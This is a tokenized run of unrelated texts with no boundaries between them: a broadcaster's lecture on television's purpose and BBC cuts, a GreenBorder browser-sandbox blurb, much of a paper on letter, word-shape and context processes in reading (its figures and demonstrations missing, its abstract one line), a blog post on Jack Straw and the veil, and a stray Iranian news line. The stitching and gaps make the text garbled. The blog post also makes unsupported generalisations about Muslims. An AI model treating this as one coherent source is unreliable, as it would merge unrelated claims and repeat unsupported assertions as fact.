When Roy Thompson described his Scottish ITV company as ‘ a licence to print money ’ he was sneered at , because by - and large the independent companies had to demonstrate that they had some higher purpose .
Granada did not produce the most punchy current affairs programme on television , World in Action , to make money .
We need to rediscover a sense of purpose .
Deep down , I do n’t think the objective has changed since that early summary as being to educate , inform and entertain .
It ’s a boring list , but it will do us as well now as ever .
Right now , it seems to me that worry about engineering has driven out worry about content .
We need to spend less time talking about how we deliver things , and a lot time talking about what we deliver .
We know what the dangers are .
Left to its itself , the medium will achieve its potential to be no more than a giant electronic circus or freak - show .
We know how bad it can get , whether it ’s the Russian station which has its newsreaders read the news while performing a striptease , or the Brazilian audience show with its Deformity of the Week feature .
In Britain , for the first several decades of its life , television has been something better than that .
The presence of the BBC was obviously a big factor .
Regulation had something to do with it .
But most of all , I think , television has maintained high standards of creative excellence and honesty because the people who worked in it believed they were doing a job which mattered .
If we were merely running a timber - mill , we should be satisfied that we were cutting lengths of wood to the right length and width and depth .
But we ’re not .
We are engaged in a trade which has the potential to do amazing things , to show people things they did n’t know existed , to give them the power to make informed decisions about how they see the world and how they want to be governed .
We have the power to open their minds .
Why else do advertisers pay such enormous sums for access ?
We are n’t dealing in lengths of wood : however much we may affect to claim that we are showing unvarnished reality , we are manufacturing something – as I say , all television – even the boring old vox pop - is artifice to some degree .
When Tony Blair made his attack on the news , a letter to one of the newspapers – I think it , unlikely as it sounds , the Daily Telegraph – defended us .
Blair should back off , because , he suggested , the media were marginally less dishonest , even though he regarded us – and this is the lapidary phrase – ‘ with genial contempt ’ .
I guess that sums up much public feeling about television .
They ’re no fools .
They understand that interviewees are selected and films are edited .
They still , I think , by and large trust us .
They may not repose as much confidence in us as in their doctor – just as well , really .
But they certainly trust us more than they trust many other sources of information .
I have always shuddered a bit when I heard television people talking about their profession .
It ’s not a profession – if it were , there would be a professional body able to enforce standards .
No , we ’re a trade .
But a trade which earned the confidence of the public because it understood that the position of intermediary was a position of trust .
I did think about ending this lecture with a list of possible initiatives .
The invention of a Viewers ’ Commisioner , with his or her own investigative staff and the power to insist upon the right to insert themselves into television programmes to correct serious mistakes if programmes themselves are unwilling to do so .
A professional body with a clear code of practice , membership of which would be a requirement of employment at any respectable company .
And lots of subsidiary ideas , like , for example , a code of practice so we can put a stop to the unpleasant spectacle of companies getting rich on the back of the willingness of young people to work for nothing .
In the end , though , those things are secondary .
They ’re engineering , too , in a way .
What ’s really needed is a much clearer sense of leadership .
There is a clear anxiety that both parliament AND television are sliding into irrelevance , disappearing into the mists of history like the quill pen and the coffee house .
The Web , we ’re told , makes expensive , professional broadcasting a thing of the past .
But the problem with blogs is the same as their strength : they do n’t operate by conventional journalistic rules about checking facts , and they ’re unencumbered by any thought that there might be more than one side to a story .
The blogosphere is a place where everyone can scream and no - one needs to listen .
Rather than making an attempt at fairness irrelevant , it seems to me it actually makes it more necessary .
The more profound problem is really about demographics .
The audience is getting older and we do n’t know what to do about it , so we have the spectacle of a bunch of middle - aged people in the grip of some comb - over compulsion .
Youth .
Where is it ?
Why does n’t it watch us ?
How do we get hold of it ?
This is the great motive force in contemporary television .
Why do they want to find it ?
The motive is the same everywhere .
Money .
Commercial television , because it is the market the advertisers crave .
The BBC because it fears that if does n’t get its nails into this age group , it ’s going to succumb to Daily Express syndrome where the paperboy shoves the newspaper through the letterboxes of houses with the curtains drawn .
( It ’s tempting to shout ‘ Stop It !
The truth is that television in Britain is commissioned by middle - aged people who rarely watch the box , attempting to reach young people who look at it even less , when it ’s actually watched by old people .
Twenty to twenty five year olds are n’t sitting goggle - eyed for one very good reason : they ’ve got better things to do .
The people who do watch it – and pay their licence fees and their other bills – are older people .
Why do n’t you give them what they want ? )
The anxiety about irrelevance expresses itself in obsessions with the red button , with interactivity , fatuous opinion polls , podcasts , ‘ multiplatform 360 degree programming ’ , etc , etc , we ’ve all heard the jargon , even if we ’re not entirely clear what some of it means .
In the process , something ’s gone wrong .
We ’ve got too interested in the way we deliver what we do , at the expense of what we deliver .
We have become obsessed with how the copper wire is organised , and forgotten about the electricity .
But where is this restatement of what television is for to come from ?
Well , the obvious place is the BBC , precisely because of its privileged position .
I know the BBC Trust has n’t been in the job very long .
But it does seem a big disappointment that it appears so far to consider its job to be more to do with chastising the senior management than with preaching a higher social purpose for the organisation .
Of course , the BBC ’s got problems of its own , and they also come down to money .
It was comprehensively outmanoeuvred by the Treasury in the last licence fee settlement , so that it is now committed to spending nearly one and a half billion on things – whether they be the cost of digital switchover , on - demand , building office blocks in Salford – which have nothing much to do with sole purpose of its existence , which is to produce worthwhile programmes .
Even so , quite how these obligations produce a budget crisis in an organisation with an assured income of three and a half billion pounds is still something of a mystery to me .
A commercial organisation confronted with the need to make economies would probably say well , our meat pies are n’t selling well , but our soups are , so let ’s get out of pies and make more soup .
The BBC is n’t a commercial organisation , of course , so instead seems to want to stay in every television and radio channel and to maintain its internet presence , but to do so with fewer resources .
The argument , I think , is that since society is more fragmented , it needs a multiplicity of outlets to serve it : why does no - one consider the alternative hypothesis that if social division is a bad thing perhaps a broadcaster ’s function could be to build social cohesion ?
But no , everyone must do more for less .
On Newsnight , for example , over the last three years we ’ve been required to make budget cuts of fifteen percent .
We have lost producers , researchers and reporters .
Nor can we make the films we once made .
Now we ’re told we likely to have to make more cuts : at least a further twenty percent over five years .
It is unsustainable , and I cannot see how the programme can survive in anything like its current form if the cuts are implemented .
To get a single – important - film transmitted last week involved surviving a sustained barrage of astonishingly threatening lawyers ’ letters from Carter Ruck and ear - bending from one of the country ’s most expensive PR firms .
You ca n’t do that if you ’re replacing grizzled output editors with people on work experience , no matter how enthusiastic they may be .
I ’m sorry if this sounds like special pleading – after all , no show has a God - given right to continue indefinitely .
But the bigger question is whether the BBC itself has a future .
Working for it has always been a bit like living in Stalin ’s Russia , with one five - year - plan , one resoundingly empty slogan after another .
One BBC , Making it Happen , Creative Futures , they all blur into one great vacuous blur .
I ca n’t even recall what the current one is .
Rather like Stalin ’s Russia , they express a belief that the system will go on forever .
I do n’t want to be apocalyptic , on the basis of what may turn out to be short - term problems .
But I think it foolish to be too confident on that score .
I guess there ’ll certainly be one more licence fee settlement .
But can we really be certain there ’ll be a fourth ?
Or a fifth ?
The problem is , the anomalies are so enormous .
The idea of a tax on the ownership of a television belongs in the 1950s .
Why not tax people for owning a washing machine to fund the manufacture of Persil ?
And how do you justify a tax on television ownership to finance production of material which will never appear on television ?
And what about material intended for television which is viewed through an iPlayer , for which no licence is required ?
It is all too easy to imagine a future in which our grandchildren will talk of having had an ancestor who worked for the BBC in the same way as people nowadays mention having had a grandparent or great - grandparent who worked for the Sudanese Political Service , or was a District Officer in Bechuanaland .
It ’s possible that good old British hypocrisy – or creative ambiguity - will get us over the contradictions inherent in the licence fee .
I certainly hope so , because the alternatives are n’t appealing .
But we have to move beyond the platitude tossed about that it is the best –or the least - worst - television service in the world .
So it bloody well ought to be .
And I speak as the presenter of programme which was obliged this spring to follow an hour devoted to celebrity dog-walking .
The BBC is going to have to justify its existence not by the way it broadcasts or the buildings out of which it works , but by what it broadcasts .
We seem , far too often , to lose sight of this .
Articulating a clear sense of purpose and expressing it through much better protection of the defining brands is more persuasive than producing the occasional piece of tea - towel television celebrating the glories of Britain .
There is a fight going on for the survival of quality television right across this industry .
The recent skirmishes and scandals have not gone our way .
As an industry we need to lay out much more clearly what we ’re doing and why .
Let ’s spend less time measuring audiences and more time enlightening them .
Despite the last few months , I do not believe that this uniquely powerful medium has been taken over by charlatans .
But we ought to acknowledge that parts of it are in danger of losing their redeeming virtues .
We need to be open .
We need to admit when we make mistakes .
We need treat our viewers with respect , to be frank with them about how and why programmes were made , to be transparent .
We need , in short , to rediscover a sense of purpose .

It 's an interesting idea : the software creates a kind of sandbox for your web browsing , so that any viruses , spyware and trojans you pick up during your session are deleted as soon as the browser is closed .
The name comes from the green border applied to your browser window when the service is active , letting you know that the whole session is being contained and no changes will be made to your PC by websites ( even downloads are opened in a virtual environment ) .
In their own words , GreenBorder has created an " easy solution to virus , spyware , and trojan threats by isolating each Internet session from the rest of the PC and earlier Internet sessions .
The beauty of the GreenBorder Pro software is it does n't need to be updated to guard against new virus signatures or new types of malware .

Abstract Research in object recognition has tried to distinguish holistic recognition from recognition by parts .

Introduction
We take reading to be serial object recognition , where each word is an object .
What are the roles of parts , wholes , and context in object recognition ?
After a hundred years of research into how people identify objects — discrete , nameable , visual stimuli — there seems to be a tentative consensus that the first step is independent feature detection and that the last step is categorization [ 1 ] – [ 5 ] .
What happens in between is less clear .
In particular , must the detected features be combined into individual “ parts ” that must in turn be combined before the object is identified , or is the whole object recognized in one fell swoop ? [ 6 ] .
Many papers on object recognition appeal to the Gestalt notion of the whole being greater than the sum of its parts , but have had only limited success in finding experimental paradigms that bear on that .
Experiments using words and faces have found an advantage for identifying whole objects over isolated parts ( letters and facial features ) , which has been taken as evidence for holistic processing , but the effects are not large enough to rule out a solely parts - based process [ 7 ] , [ 8 ] .
Other attempts to distinguish holistic from by - parts processing have measured effects of occlusion , scrambling , viewpoint , expertise , inversion , mismatched and misaligned composites , and self - crowding [ 8 ] – [ 15 ] .
Though every study presents data consistent with one process or the other , none of these tests , except scrambling and self - crowding , manages to rule out the alternative [ see 16 ] .
Past work has used qualitative tests to choose between holistic and by - parts processes .
However , “ the distinction between [ holistic and by - parts ] processing may be a continuum rather than a dichotomy ” [ 17 ] .
Some recognition tasks may benefit from both holistic and by - parts processes .
If so , one might ask how much each process contributes .
Information from the object 's environment and the observer 's prior knowledge can be used to recognize objects as well .
We lump all task - relevant information other than the object itself into the catch - all “ context ” .
Here we introduce quantitative measures of the contribution of each recognition process : by - parts , holistic , and context .
The question is : if parts , wholes , and context all play roles in object recognition , do the mental processes associated with them interact ?
Does impairing one process impair the others as well ?
Or , alternatively , if we remove one process , will the others continue working , unaffected ?
To explore this question , we turn to reading .
We want to know how people quickly and effortlessly recognize an object when there are a vast number of possibilities .
Ordinary reading demonstrates this amazing human skill .
In studying object recognition , reading is one of the few cases where one knows the composition : letters are parts , words are wholes , and sentences provide context .
Using reading , we can attempt to isolate and measure the contributions of parts , wholes , and context to the recognition of words as objects .
This analysis addresses a central question in reading .
What makes fast readers fast , and how should reading be taught to make everyone fast ?
This question has fuelled a century of reading wars [ 18 ] , [ 19 ] .
Each of three processes , which we will call L , W , and S , has been championed at some time , along with a method of reading instruction tailored to emphasize it over the others .
L , W , and S each take a different input , but all three processes emit words .
Mechanical letter - by - letter decoding , “ L ” , was once disparaged as fit only for beginning readers .
Today it is accepted as the basis for fast adult reading , and schools now teach it through practice in ‘ phonics , ’ grapheme - to - phoneme conversion [ 20 ] , [ 21 ] .
Now consider “ S ” .
Text is somewhat predictable .
Readers can predict the next word in a passage 20 to 35 % of the time , depending on their reading experience [ 19 ] , [ 22 ] .
In the whole - language method , children are encouraged to use the story and sentence context ( S ) to guess the next word .
Lastly , holistic recognition of words by their shape , “ W ” , once seemed a promising visual account for fast recognition of words , supported by evidence from the Word Superiority Effect ( but see ref. 7 ) , and motivated the whole - word method , which had children memorize and read the same few “ sight words ” over and over .
Work on ‘ crowding ’ has shown that words are not usually recognized as wholes , even by adults , but rather that the visual system must isolate and recognize the individual letters to get the word [ 8 ] .
However , when the word is crowded , it is impossible to isolate the letters .
We call what can still be gleaned ‘ word shape ’ .
Bouma showed that words can only be recognized when the letters are spaced far enough apart [ 23 ] .
This critical spacing depends on where the word is in the visual field and little else [ 24 ] .
When the letters are separated by less than the critical spacing , the reader cannot identify them , and the word is illegible .
Critical spacing increases in proportion to distance from fixation .
For text of any given letter spacing , there is a central field that is uncrowded , and a peripheral field that is crowded [ 25 ] .

The LWS model of reading rate .
The model ( Eq. 1 ) has three parameters ( L , W , S ) , the reading rates of the letter - by - letter , whole - word , and sentence - context processes .
For each condition , the model predicts a reading rate ( word / min ) that is the sum of the rates of the spared processes .
For each of 11 observers , we measured reading rates for all eight possible combinations of knockouts .
The model was fit , separately , to the data for each observer .
This table shows the model fit .
The observer data are shown in Table 1 .
The fit 's mean ±SD , across observers , is shown for each condition .
( The SE is about one third the SD . )
The model fits every observer well ( Table 2 ) .
The overall RMS error , across conditions and observers , is 22 word / min .
The excellent fit of the additive model ( Eq. 1 ) proves triple dissociation with a combination rule of summation [ 37 ] .
https://doi.org/10.1371/journal.pone.0000680.g001
Here we measure the contributions of the L , W , and S processes to reading rate by manipulating text in ways that selectively knock out each source of information while sparing the others .
Scrambling word order knocks out the S information , which the reader uses to guess the word from its context :
Alternating case knocks out the W information , which the reader uses to recognize words by their gross shape : Substituting similar letters ( indistinguishable when viewed peripherally ) knocks out the L information , which the reader uses to identify the word by identifying its letters :
The alternating - case and word - shuffling manipulations are borrowed from the reading literature as - is [ 26 ] , [ 27 ] , but we used our knowledge of object recognition to refine the substitution paradigm [ 28 ] .
As you see , the L knockout is devastating , but we know it spares word shape , as defined here , because the substitutions are undetectable when crowded .
Recognizing an object by parts ( a word by letters ) requires isolation of each part from the rest of the object [ 24 ] , [ 29 ] .
When the isolation field is bigger than the word , which happens when the word is far from the center of gaze , the word can only be seen holistically .
We use this –what can be seen holistically –as our definition of ‘ word shape ’ .
Thus , any two letter strings that are indistinguishable under these conditions have the same word shape .
Using peripheral viewing , we discovered , by trial and error , which letter substitutions could be made without affecting word shape .
In the demonstration below , you can verify that our substitutions preserve the word shape of “ Reading ” , by fixing your eye on the plus and comparing the two words peripherally .
They are indistinguishable even though only 3 of the 7 letters ( d , i , and g ) are the same .
The letter substitutes that passed our test ( indistinguishable when viewed in the periphery with flanker letters on both sides ) are listed in Figure 2 .
This list was used for letter substitution .
Alternating case knocks out the holistic word process ( W ) , which can identify some highly familiar words even when the letter ( L ) information is degraded by crowding or letter substitution .
When fixating the plus , the word “ and ” on the left is obvious , even though the letters are crowded .
You are using word shape to read “ and ” .
On the right , you can see that there is a word , and you might even be able to get the exposed letters on the ends [ 23 ] , but you can't read the word .
Alternating case has destroyed word shape .
Few words can be recognized by word shape alone , which is consistent with reports that alternating case has at most a small effect on reading speed and accuracy ( 26 , 30 – 34 ) .
We can be confident that each of these three manipulations affects only one of the three sources of word information in the text .
But what about the corresponding recognition processes ?
The three kinds of information are distinct , but the processes may not be .
Can we selectively knock out one process , or does impairing one process impair the others as well ?
By applying these manipulations one at a time , we measure how much each word - recognition process–L , W , and S–contributes to normal reading rate .
By applying them in combination , we test the selectivity of the knockouts and discover the degree to which the reading processes depend on each other .

Discussion
Our main result is the discovery of a triple dissociation among L , W , and S .
A within - task triple dissociation with a composite measure is evidence that “ the task is accomplished by a complex process that contains [ three ] functionally distinct and separately modifiable parts ” [ 37 ] .
That letters , words , and sentences are all involved in reading is nothing new , but finding that their contributions to reading rate are additive is startling .
Even so , our results are consistent with the Gough et al . [ 22 ] study that isolated the contributions of word ‘ form ’ and sentence ‘ context ’ .
They measured the proportion of words correctly named , isolating the contribution of form by measuring the effect of word duration and isolating the effect of context by measuring the effect of the number of preceding words in the sentence .
They found that “ the probability of word recognition given both form and context conforms very closely to the values one would obtain if the contributions of form and context were independent ” [ 22 ] .
Here , we separate ‘ form ’ into its two components , L and W , and show that the contributions of these processes to reading rate are independent of each other and of the contribution of the sentence context ( S ) .
What do our results say about the mechanisms underlying reading ?
One might be tempted to think that the additive , independent contributions to reading rate mean that there are three completely autonomous reading processes .
But that does n't follow .
It 's not that simple .
If the three processes were operating independently , most of the words produced by the two weaker processes ( S and W ) would be redundant with those produced by the stronger process ( L ) .
This would mean that the contributions of S and W would be greater when L is absent than when L is present , which is not what we find .
Additivity of rates implies exclusivity .
The contribution of each process to reading rate is the same whether the other processes are working or not .
Thus , the contributions are not redundant .
The three processes are not working on the same words .
This requires coordination among the processes .
For the contributions of S and W to be equally valuable with and without L , L has to skip those words or devote only a small fraction of the time it normally would to those words before moving on to the next one .
Imagine that L , W , and S are three technicians in a computer store .
As customers arrive , the technicians avoid handling the same ones .
Instead , L is a generalist , who handles most of the customers , while S and W are specialists , who only handle certain kinds of computer problems .
S's and W's total performance cannot match L's , because they only handle certain customers , but , for those customers , they are faster than L would be .
When such a customer walks in , S or W immediately lets L know he will handle it , so L can take the next person .
The customers ( words ) that S and W can handle are infrequent .
L could work on all words , but usually does not need to , because S and W handle some of them .
To help , S or W must let L know immediately that he will get this word .
In the case of S , supposing early notification is supported by MEG and ERP research showing that predictable words are processed much earlier than unpredictable ones [ 39 ] , [ 40 ] .
We suspect that W , too , warns L early .
It takes time to assemble the parts of a complex word [ 41 ] .
From this , we might expect the one - step assembly ( features to word ) of the holistic ( W ) process to be faster than the two - step assembly ( features to letters to word ) of the by - parts ( L ) process .
Word shape has been a slippery concept [ 42 ] , [ 43 ] .
Here , defining word shape by a practical test for holistic equivalence allowed us to isolate and measure the contribution of the process , W , that recognizes words as wholes .
Past studies have measured effects of substituting letters [ 28 ] , [ 44 ] , changing case [ 26 ] , [ 30 ] –[ 34 ] , [ 38 ] , and shuffling words [ 27 ] , but , applied separately , these manipulations only assess how much each degradation of the text impairs reading .
This says something about effectiveness , but nothing about the specificity of the knockout .
Only by combining the manipulations could we discover the additivity .
The triple dissociation proves that the text manipulations are selective .
We hope the newly - revealed selectivity of these time - worn tools will prove useful in further explorations of reading .
Our findings challenge the most successful models of reading .
Ever since the discovery that reading consists of a series of fixations rather than a continuous sweep of the eyes across the text [ 45 ] , investigators have looked to the eye movements for clues into how reading works .
E - Z Reader [ 46 ] and SWIFT [ 47 ] model the eye movements of reading .
These models include a word - recognition stage whose latency is affected by language properties such as word familiarity and word length , so they do make some use of context and word shape , but they cannot read at all when the letter information is knocked out .
Similarly , Mr. Chips [ 48 ] and the Dual Route Cascaded model [ 49 ] simulate a wide variety of visual and language effects on reading rate and latency , but both models implement only the L process , plan to later add S , and omit W entirely .
Our results cry out for implementation of W and S , which , together , account for 38 % of reading rate .
We suspect that it will be difficult for the models to achieve the additivity of rates that is so robust in the human data presented here .
Our approach treats reading as serial word recognition .
It is surprising that such a simple model succeeds so well in describing how readers benefit from the three sources of information available in reading .
Our results affirm the practical emphasis on L in schools , but challenge current computational models , revealing that W and S do contribute and make reading possible when L is knocked out .
It has long been known that we recognize objects by parts , wholes , and context .
The surprise is that each process contributes the same number of words per minute regardless of whether the others are operating .
This is a triple dissociation among parts , wholes , and context .
Materials and Methods Reading rate
We measured reading rate in three ways .
The results in Figure 1 and Tables 1 –2 used the RSVP method described below .
We also collected similar results on one observer ( EK ) reading printed pages , aloud and silently ( Table 3 ) .
In the page - reading experiments , the observer was instructed to read each page as quickly as possible while still getting most of the words right .
Aloud , she read 80 % –100 % of the words correctly in every condition .
Accuracy could not be measured when she read silently .
The LWS model fits well in every case , and the parameters ' proportions were very similar for the three methods ( Table 3 ) .
Past studies have found that reading rate and comprehension when reading words presented serially ( RSVP ) are not very different from when reading static words on a page .
Yu , Cheung , Legge , and Chung compare reading rate as a function of text size for text presented dynamically , one word at a time ( RSVP ) , or statically , all together ( static flashcard with four lines of text ) [ 50 ] .
RSVP reading is faster ( 1.4 × ) but the log reading rate curves are parallel ( one is shifted upward ) , showing the same dependence on spacing .
Masson assessed readers ' comprehension of texts presented using RSVP versus statically [ 51 ] .
He found that when 500 ms pauses were inserted between sentences , accuracy in answering specific questions about the text read was the same for 500 word / min RSVP as when the whole passage was displayed for the same total length of time [ 51 , Table 2 , page 270 ] .
Observers Eleven observers ( ages 17 – 25 ) participated .
All had normal or corrected - to - normal vision and were fluent in English .
All observers gave informed consent and were paid for their participation .
Observer KT is an author .
Stimulus generation
Our stimuli were generated using MATLAB with the Psychophysics Toolbox [ 52 ; 53 ; http://www.psychtoolbox.org] and were displayed on a Philips FIMI GD402 very high brightness 21 ” grayscale monitor , sold in the USA by AFP Imaging as the “ BrightView ” , whose frame rate was 75 Hz .
Words were presented as black text on a white background ( 156 cd/m2 ) .
Text
The text came from the mystery novel Loves Music , Loves to Dance by Mary Higgins Clark [ 35 ] , a bestseller written for a broad , popular audience .
It is an easy text , with a 7.5 Fog Index and a 5.5 Fleish - Kincaid Index .
The text was not edited in any way before the application of the LWS manipulations .
All proper nouns , capitalization ( except in alternating - case trials ) , and punctuation were retained .
The text was displayed in the Linotype font Helvetica Neue LT 85 Heavy , at an x -height of 0.39 deg and center - to - center letter spacing of 0.53 deg .
This imposes uniform center - to - center spacing , overriding the font 's ordinary spacing .
No observer read the same passage twice .
RSVP Using Rapid Serial Visual Presentation ( RSVP ) , we presented each word , one after the other , in the same place on the screen [ 36 ] .
The reported reading rate ( Table 1 ) is the rate at which words were presented , six per trial , while the observer achieved an accuracy of 80 % correct .
On each trial , the observer read the six words aloud , taking as long as she liked .
Legge notes that “ for procedures in which maximum reading speed is computed from the display time of short texts , and oral reading speed is used only to check for accuracy , oral and silent reading speeds are approximately the same ” [ 54 ] .
Our average reading rate of 396 word / min is faster than the typical reading rate of 250 word / min for adults reading a printed page .
Our rates are faster partly because RSVP eliminates the need for eye movements [ 36 ] and partly because of a speed - accuracy trade - off .
We use an adaptive procedure that iteratively adjusts the presentation rate to achieve a desired error rate .
The error rate of normal silent reading is very low and hard to measure .
We used the criterion of 80 % correct , i.e. 20 % mistaken , which allows faster reading .
The controlled error rate ( achieved through the adaptive control of presentation rate ) is an important feature of our experiment .
We want to know how quickly observers can read when pressed .
We are not interested in how their preferred rate might be affected by unfamiliar formatting of the text .
Instead of leaving it to the observer 's whim , the RSVP presentation controls the presentation rate , and the adaptive procedure ( QUEST ) finds the rate that yields 80 % correct identification of the words [ 55 ] .
The fixed error rate ( 80 % correct ) contributes to the specificity of our knockouts .
The contribution of the sentence context ( S ) would be reduced by any condition that reduced the fraction of words identified .
Our procedure adjusts presentation rate to maintain a fixed accuracy .
All our reported rates and model fits in Figure 1 and Tables 1 – 2 were collected with an 80 % accuracy criterion .
Pilot results using higher and lower criteria are consistently well - fit by the LWS model .
The LWS rates decrease as the accuracy increases .
Spatial and temporal flankers
In order to simulate page reading , where each word is preceded and followed by another word , we added a random letter flanker one letter - space away from the beginning and end of each target word : “ x word h ” .
Observers were asked to ignore the flankers .
In order to minimize end - effects in the 6 - word sequence of a trial , we added a random letter string before the first word in a trial and another after the last word .
These temporal flankers were displayed for the same length of time as the target words in that trial , and observers were asked to ignore them .
Without temporal flankers , the first and last words in a trial showed a strong advantage over the middle four .
With the temporal flankers , there is no longer any advantage for the last word in a trial .
The primacy effect , enhanced performance on the first word , was reduced , but not eliminated , by the addition of temporal flankers .
Fixation
Two black squares ( 0.2 deg ) were centered 0.9 deg above and below the center of the word .
The observer , seated 200 cm from the screen , was instructed to fixate between the two squares and read the words aloud .
Spatial and temporal flankers ( as described above ) were present on all trials .
Trial , run , and threshold Each trial contained six words , presented one at a time at the same location ( between the black squares ) .
Each run consisted of 15 trials .
Except for the scrambled condition , explained below , the text for each trial and run began at the point in the novel where the previous trial and run ended .
Each observer completed approximately ten practice runs with plain text before data collection began .
The 8 reading conditions of Figure 1 were tested in random order .
Before each run , the observer was told which condition she would be reading .
The observer was given unlimited speaking time , and correctly read words were counted regardless of word order .
Errors in word order were rare , occurring on less than 10 % of the trials , with and without scrambled word order .
After each trial , an answer screen showed the correct six words , and the experimenter recorded the number of words missed .
Observers were encouraged to look at the correct words on the answer screen .
The QUEST adaptive staircase increased or decreased the presentation rate of the words for the next trial , homing in on threshold rate for 80 % accuracy [ 55 ] .
Each reading rate recorded in Table 1 is the average of two or three runs .
Word shape and letter substitution
The approach we are taking to shape is analogous to the scientific approach to color .
When multiple mechanisms are potentially involved in a task , it is useful to design stimuli so that one of the mechanisms can't tell them apart .
Then , any effects of exchanging the stimuli can be attributed to the other mechanisms , excluding the one that is blind to the difference .
This technique is called “ silent substitution ” [ 56 ] .
It is common in color vision experiments to equate the luminance of two stimuli and thereby rule out any role of the achromatic channel in accounting for differences in response to these stimuli .
In the perceptual discrimination test used to generate Figure 2 , the observer compared the peripherally - presented original letter and candidate substitute , each flanked on both sides by the same pair of flanking letters and judged whether they were discriminable or not .
Letter size was 2 deg x -height , center - to - center spacing was 2.5 deg , and the triplets were presented at horizontal eccentricities of ± 10 deg .
Note that this paper is not about peripheral vision .
Nor did we seek out the periphery as an example of bad vision .
This paper is about reading .
We use peripheral vision as part of an experimental technique that isolates a shape process ( W ) that is common to both central and peripheral vision .
We are using the periphery in a particular way , to knock out the letter - based process , in order to isolate the word - shape channel .
We empirically assembled a table of letter substitutions that are invisible to the observer 's perception of word - shape when the letter - based identification mechanism is absent .
When Underwood and McConkie [ 31 ] used letter substitution to destroy word shape in their moving window paradigm , they defined “ word shape ” as the gross outline , and selected substitute letters from the original letter 's category : having an ascender ( e.g. bh ) , descender ( e.g. pq ) , or neither ( e.g. ac ) .
However , though hallowed by tradition , there is no theoretical or empirical basis for that definition of word shape .
We instead define word shape operationally ( what can be distinguished when crowded ) and choose the letter substitutes so as to be visually indistinguishable from the original when crowded .
However , this is less different than it sounds , as our letter substitution table turns out to be similar to theirs .
In the L knockout condition , we explained to observers that letters would only be substituted by other letters that look like them ( for example , letters with ascenders would never be substituted by letters without ascenders ) .
Observers were told to say the original word they thought the target had been before substitution , not to try to pronounce nonsense words .
Observers were also informed that not all letters have substitutes , and letters with substitutes were not always substituted ( i.e. , a letter with substitutes could be randomly substituted by itself ) .
Because of these rules , some words in substitution trials were unmodified .
Even so , the substitution manipulation was very effective .
It slowed reading to a crawl .
The L knockout by substitution is quite effective , but not total .
We attribute the residual reading rate ( 50 word / min ) in the triple - knockout condition ( see Table 1 ) to letter decoding , i.e. we think that L as reported here slightly underestimates the true value of the process .
We tried making the knockout more severe ( by not allowing a same - letter substitution when alternatives were available ) but , as one would expect , this makes some conditions untestable because the observer cannot reach 80 % correct at any presentation rate .
As you might guess from the demonstrations in the Introduction , most words are not easily identified by word shape .
Random words cannot be read reliably based on word shape alone [ 8 ] .
The W process identifies only some of the words .
These are often short , high - frequency words such as “ and ” ( see demo in Introduction ) .
Scrambling sentences
To knock out the S process , word order was scrambled across the 90 words in a run .
Preserving sentence context
As mentioned above , each ( ordered ) trial began where the previous trial left off .
This means that only some of the trials began at the beginning of a sentence .
Many RSVP reading studies , some of which report extremely high reading rates , begin each trial at the beginning of a sentence [ e.g. , 27 ] .
However , we do not think our method lessened the contribution of the S process in the ordered trials .
First of all , sentence context is preserved by our use of an 80 % criterion , which insures that readers recognize most of the words .
Also , we always presented the correct six words on the response screen at the end of each trial .
Therefore , at the beginning of any trial after the first , the observer had the context of the novel up to that point .
Granted , we did randomize the order of scrambled and ordered runs .
But still , within any given run with S intact , the observer is given much opportunity to make use of the storyline .
This is , we think , more like the normal reading experience than using random sentences or artificially restricting our text to only include 6 - word sentences .

So the biggest story of the last 24 hours has been Jack Straw politely requesting Muslim women not to wear a veil .
Certainly Jack Straw got the debate he wanted .
However I have a few questions .
1 . Despite the apparent controversy raging in the media , many of the Muslims interviewed have been men .
Excuse me , but it 's not men that are being asked to lower the veil .
Would I ask a bunch of men their opinion on whether bras were too tight ?
Could we ask the BBC for more female opinions please ?
2 .
In all the time that Jack has been asking women , they have been free to refuse and none have done so .
Does this not imply that the real people objecting are the men who wish to subjugate women to the status of dressing up according to their ideals rather than what the women want ?
Is this acceptable in a Western Society which advocates equality ?
3 .
If women are choosing to dress this way , why is it that the toilet on air flights out of strictly Muslim countries is full for the first hour of the flight while women change into normal clothes ?
4 .
If we force people to show their face at passport control , is a polite request in an MPs surgery really so controversial ?
What if veiled women want to go into a bank which has a big sign saying " Motorcyclists please remove your helmet ' .
Is it not seen as a security risk that a bloke could dress in a veil to rob a bank ?
The identity parade could be quite interesting .
Also , what is going to happen when ID cards become mandatory ?
5 .
If western , non Muslim , women do n't cover their heads in Muslim countries or drive a car in Saudi Arabia , they face arrest .
Westerners MUST conform to Muslim ideals in Muslim countries .
If we had the same attitude here we'd be forcing Muslim women to go around half naked in summer like most Western women .
The fact that we do n't is a sign that we are a tolerant society , so why is it so controversial just to ask the question or removing a veil ?
We enshrine freedom of speech in this country and not being allowed to ask the question or have a debate on it is an attack on this right .
6 .
If a Muslim woman comes to collect a child from school and is wearing a veil , how do you know it is her and not a kidnapper ?
7 .
Supposing you employ a Muslim woman wearing a veil at work and you employ a deaf person .
The deaf person will not be able to work with the Muslim woman as they will be unable to lipread .
If the deaf person can't do their job as a result , they could sue under the Disability Discrimination Act .
The Muslim woman could sue under Religious Discrimination .
Who is right ?
8 . The Muslim custom of wearing a veil could be considered the Islamic equivalent of men in western countries wearing ties .
Neither is in fact prescribed by any religion .
Both are long standing customs that allow the wearer to conform toideals of dress .
When we accept men in this country without ties to be equal to those that do and do not force any man to wear a tie at work then we will be in a much better position to judge the dress codes of other nations and religions when we have learned to accept people for who they are , not how they dress .
Is the request for women to show their faces a parallel of expecting male politicians not to hide their mouth behind a beard ?
9 .
Why is it that because an extremely tiny proportion of radical Muslims advocate violence and terrorism that suddenly every story concerning Muslims suddenly becomes a major crisis point ?
Did we react the same way towards all Irish people and carefully consider their point of view when the IRA was terrorising London .
No .
You can just imagine the nonsense that would ensue if Irish jokes were banned following an IRA bomb .
Double standards ?
10 .
If you look at the BBC debate on this point you 'll see that the vast majority of people think on the BBC forum think that Jack Straw is right .
If the BBC was reporting this in a balanced way , their TV reports could perhaps give some more objective analysis of this discussion by conducting an opinion poll amongst both the public at large and the people affected , namely Muslim WOMEN .
Then we would be able to look at the issue objectively rather than the endless vox pops we 've been getting where one person who disagrees with Jack seems to be speaking for the entire Muslim community when clearly the position is likely to be a lot more complex than that .
In the struggle for so called balanced reporting , are the views of a small minority being over emphasised ?
Can we have faith in more objective discussion on this or will the BBC continue to cover it up ?
Iranian Ambassador to Damascus Mohammad Hassan Akhtari on Thursday condemned the alleged violation of the Syrian airspace by Israeli aircraft .
According to a report on the Iranian Broadcasting Authority 's website .
